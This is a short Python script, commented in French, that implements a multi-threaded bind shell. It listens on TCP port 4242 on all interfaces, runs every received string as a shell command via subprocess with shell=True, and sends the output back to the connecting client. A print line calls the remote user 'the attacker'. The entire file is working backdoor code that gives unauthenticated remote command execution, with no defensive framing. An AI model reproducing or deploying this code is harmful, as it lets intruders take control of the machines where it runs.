#!/usr/bin/env python3
# coding: utf-8

import socket
from _thread import *
import subprocess
import time
import os

host=''
port=4242
ThreadCount = 0

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

s.bind((host, port))
s.listen(5)

def multi_threaded_client(conn):
    while True:
        data = conn.recv(1024).decode("utf-8")
        if data:
            print("Commande demandée par l'attaquant : %s" % data)
            try:
                output = subprocess.check_output(data, shell=True)
            except subprocess.CalledProcessError as e:
                output = str(e).encode()
            if output == "":
                output = data + " executed"
            conn.send(output)
    conn.close()


while True:
    conn, address = s.accept()
    print('Connected to: ' + address[0] + ':' + str(address[1]))
    start_new_thread(multi_threaded_client, (conn, ))
    ThreadCount += 1
    print('Thread Number: ' + str(ThreadCount))
